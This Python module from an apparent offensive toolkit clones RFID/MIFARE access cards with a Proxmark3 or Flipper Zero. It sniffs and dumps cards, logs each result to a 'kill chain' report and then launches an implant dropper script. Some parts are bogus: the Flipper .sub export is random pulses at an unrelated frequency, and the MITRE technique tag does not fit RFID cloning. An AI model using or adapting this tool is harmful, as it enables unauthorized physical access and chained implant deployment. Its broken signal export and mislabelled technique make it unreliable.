# modules/attacks/rfid_cloner.py

import argparse
import subprocess
import os
import json
from datetime import datetime
import time
import base64
import random

LOG_PATH = "results/rfid_clone_logs.json"
ALERT_FILE = "webgui/alerts.json"
KILLCHAIN_FILE = "reports/killchain.json"
CHAIN_SCRIPT = "implant_dropper.py"
RFID_SUB_EXPORT = "results/cloned_tag.sub"
AGENT_ID = "rfid_cloner"
MITRE_TTP = "T1557.002"

os.makedirs("results", exist_ok=True)
os.makedirs("webgui", exist_ok=True)
os.makedirs("reports", exist_ok=True)

def log(msg):
    print(f"[RFID] {msg}")

def push_alert():
    alert = {
        "agent": AGENT_ID,
        "alert": "RFID cloning operation completed",
        "type": "physical",
        "timestamp": time.time()
    }
    with open(ALERT_FILE, "a") as f:
        f.write(json.dumps(alert) + "\n")

def update_killchain(info):
    entry = {
        "agent": AGENT_ID,
        "event": info,
        "time": time.time()
    }
    with open(KILLCHAIN_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

def log_clone(entry):
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def run_proxmark_clone(interface, output_file):
    log("Trying Proxmark3...")
    try:
        result = subprocess.run([
            "proxmark3", interface,
            "-c", f"hf 14a snoop; hf mf dump; save {output_file}"
        ], capture_output=True, text=True, timeout=60)
        log("Proxmark3 output:\n" + result.stdout)
        return "proxmark3", True
    except Exception as e:
        log(f"Proxmark3 failed: {e}")
        return "proxmark3", False

def run_flipper_clone(output_file):
    log("Trying Flipper Zero...")
    try:
        result = subprocess.run([
            "flipper", "read", "rfid", "--out", output_file
        ], capture_output=True, text=True, timeout=30)
        log("Flipper output:\n" + result.stdout)
        return "flipper", True
    except Exception as e:
        log(f"Flipper failed: {e}")
        return "flipper", False

def export_flipper_sub():
    with open(RFID_SUB_EXPORT, "w") as f:
        f.write("Filetype: Flipper SubGhz RAW File\n")
        f.write("Version: 1\n")
        f.write("Frequency: 125000000\n")
        for _ in range(100):
            pulse = random.randint(800, 1800)
            space = random.randint(300, 600)
            f.write(f"+{pulse} -{space}\n")
    log(f"Flipper .sub signal saved to: {RFID_SUB_EXPORT}")

def chain_next():
    log("Chaining next payload...")
    os.system(f"python3 {CHAIN_SCRIPT}")

def clone_rfid(interface, tool, output_file):
    if tool == "proxmark3":
        hw_used, success = run_proxmark_clone(interface, output_file)
    elif tool == "flipper":
        hw_used, success = run_flipper_clone(output_file)
    else:
        log(f"Unsupported tool: {tool}")
        return

    timestamp = datetime.utcnow().isoformat()
    entry = {
        "timestamp": timestamp,
        "tool": hw_used,
        "interface": interface,
        "output_file": output_file,
        "success": success,
        "ttp": MITRE_TTP
    }

    log_clone(entry)

    if success:
        log(f"Clone saved: {output_file}")
        export_flipper_sub()
        push_alert()
        update_killchain(f"{hw_used} RFID clone complete")
        chain_next()
    else:
        log("Cloning failed.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="RFID Cloner (Proxmark3/Flipper)")
    parser.add_argument("--tool", required=True, choices=["proxmark3", "flipper"])
    parser.add_argument("--interface", default="ttyACM0", help="e.g., ttyACM0 for Proxmark3")
    parser.add_argument("--output", default="results/cloned_rfid.bin", help="Output file")
    args = parser.parse_args()

    clone_rfid(args.interface, args.tool, args.output)
